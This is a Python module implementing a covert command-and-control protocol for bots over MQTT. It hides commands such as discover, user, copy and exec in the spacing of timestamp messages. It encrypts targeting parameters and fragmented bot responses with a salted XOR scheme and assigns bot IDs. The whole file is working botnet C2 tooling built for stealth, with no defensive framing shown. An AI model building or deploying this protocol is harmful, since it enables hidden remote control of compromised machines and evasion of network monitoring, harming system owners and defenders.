"""
Covert MQTT C&C Protocol

Commands encoded via spaces in time messages: "Time:[S1]TIMESTAMP[S2]"
  S1 = 0,1,2 spaces after colon    S2 = 0,1,2 spaces at end

  DISCOVER(00) WHO(01) LS(02) USER(10) COPY(11) EXEC(12) LIST(20) PING(21)

Encryption: XOR cipher with 4-byte salt + SHA256-derived key
Bot IDs: A#### format (e.g., A1234)
"""

import json
import base64
import hashlib
import os
import time
import random
from datetime import datetime
from typing import Optional, Dict, Any, List

CMD_ENCODE = {
    "discover": (0, 0), "who": (0, 1), "ls": (0, 2),
    "user": (1, 0), "copy": (1, 1), "exec": (1, 2),
    "list": (2, 0), "ping": (2, 1),
}
CMD_DECODE = {v: k for k, v in CMD_ENCODE.items()}

MAX_MSG_SIZE = 150
FRAGMENT_TIMEOUT = 60.0
_fragment_buffer: Dict[str, Dict] = {}


def _get_key(secret: str) -> bytes:
    return hashlib.sha256(secret.encode()).digest()


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))


def _encrypt(plaintext: str, secret: str) -> str:
    key = _get_key(secret)
    salt = os.urandom(4)
    salted_key = hashlib.sha256(salt + key).digest()
    encrypted = _xor_bytes(plaintext.encode(), salted_key)
    return base64.b64encode(salt + encrypted).decode()


def _decrypt(token: str, secret: str) -> Optional[str]:
    try:
        key = _get_key(secret)
        raw = base64.b64decode(token)
        if len(raw) < 5:
            return None
        salt, encrypted = raw[:4], raw[4:]
        salted_key = hashlib.sha256(salt + key).digest()
        return _xor_bytes(encrypted, salted_key).decode()
    except Exception:
        return None


def create_time_signal(command: str) -> str:
    if command not in CMD_ENCODE:
        raise ValueError(f"Unknown command: {command}")
    s1, s2 = CMD_ENCODE[command]
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return f"Time:{' ' * s1}{timestamp}{' ' * s2}"


def parse_time_signal(message: str) -> Optional[str]:
    if not message.startswith("Time:"):
        return None
    try:
        rest = message[5:]
        s1 = min(len(rest) - len(rest.lstrip(' ')), 2)
        s2 = min(len(rest) - len(rest.rstrip(' ')), 2)
        return CMD_DECODE.get((s1, s2))
    except (ValueError, IndexError):
        return None


def create_params_message(command: str, target: str, params: Dict[str, Any] = None) -> str:
    secret = f"SECRET_{command.upper()}"
    payload = {"t": target[:5] if target != "*" else "*", "p": params or {}}
    return _encrypt(json.dumps(payload, separators=(',', ':')), secret)


def parse_params_message(encrypted: str, command: str) -> Optional[Dict[str, Any]]:
    plaintext = _decrypt(encrypted, f"SECRET_{command.upper()}")
    if not plaintext:
        return None
    try:
        data = json.loads(plaintext)
        return {"target": data.get("t", "*"), "params": data.get("p", {})}
    except json.JSONDecodeError:
        return None


def create_response_messages(command: str, bot_id: str, result: Any, success: bool = True) -> List[str]:
    secret = f"SECRET_{command.upper()}_RESPONSE"
    result_str = json.dumps(result, separators=(',', ':')) if isinstance(result, dict) else str(result) if result else ""
    chunk_size = 12
    chunks = [result_str] if len(result_str) <= chunk_size else [result_str[i:i + chunk_size] for i in range(0, len(result_str), chunk_size)]

    messages = []
    total = len(chunks)
    for i, chunk in enumerate(chunks):
        payload = {"b": bot_id[:5], "s": 1 if success else 0, "r": chunk}
        if total > 1:
            payload["f"] = f"{i + 1}/{total}"
        messages.append(_encrypt(json.dumps(payload, separators=(',', ':')), secret))
    return messages


def parse_response_message(encrypted: str, command: str) -> Optional[Dict[str, Any]]:
    global _fragment_buffer
    plaintext = _decrypt(encrypted, f"SECRET_{command.upper()}_RESPONSE")
    if not plaintext:
        return None

    try:
        data = json.loads(plaintext)
    except json.JSONDecodeError:
        return None

    bot_id = data.get("b", "?")
    success = data.get("s", 1) == 1
    result = data.get("r", "")
    fragment = data.get("f")

    if not fragment:
        return {"bot_id": bot_id, "success": success, "result": _parse_result(result), "complete": True}

    try:
        current, total = map(int, fragment.split("/"))
    except ValueError:
        return None

    buffer_key = f"{command}_{bot_id}"
    if buffer_key not in _fragment_buffer:
        _fragment_buffer[buffer_key] = {"chunks": {}, "total": total, "success": success, "timestamp": time.time()}

    _fragment_buffer[buffer_key]["chunks"][current] = result

    if len(_fragment_buffer[buffer_key]["chunks"]) == total:
        full_result = "".join(_fragment_buffer[buffer_key]["chunks"].get(i, "") for i in range(1, total + 1))
        success = _fragment_buffer[buffer_key]["success"]
        del _fragment_buffer[buffer_key]
        return {"bot_id": bot_id, "success": success, "result": _parse_result(full_result), "complete": True}

    return {"bot_id": bot_id, "success": success, "result": None, "complete": False,
            "have": len(_fragment_buffer[buffer_key]["chunks"]), "need": total}


def _parse_result(result_str: str) -> Any:
    if not result_str:
        return {"status": "ok"}
    try:
        return json.loads(result_str)
    except json.JSONDecodeError:
        return {"output": result_str}


def cleanup_fragments(max_age: float = FRAGMENT_TIMEOUT):
    global _fragment_buffer
    now = time.time()
    for k in [k for k, v in _fragment_buffer.items() if now - v.get("timestamp", 0) > max_age]:
        del _fragment_buffer[k]


def generate_bot_id() -> str:
    return f"A{random.randint(1000, 9999)}"


def is_for_bot(target: str, bot_id: str) -> bool:
    return target == "*" or target == bot_id[:5]


if __name__ == "__main__":
    print("=== Covert Protocol Demo ===\n")
    print("Time Signals:")
    for cmd in CMD_ENCODE:
        msg = create_time_signal(cmd)
        print(f"  {cmd:8} -> '{msg}' -> {parse_time_signal(msg)}")
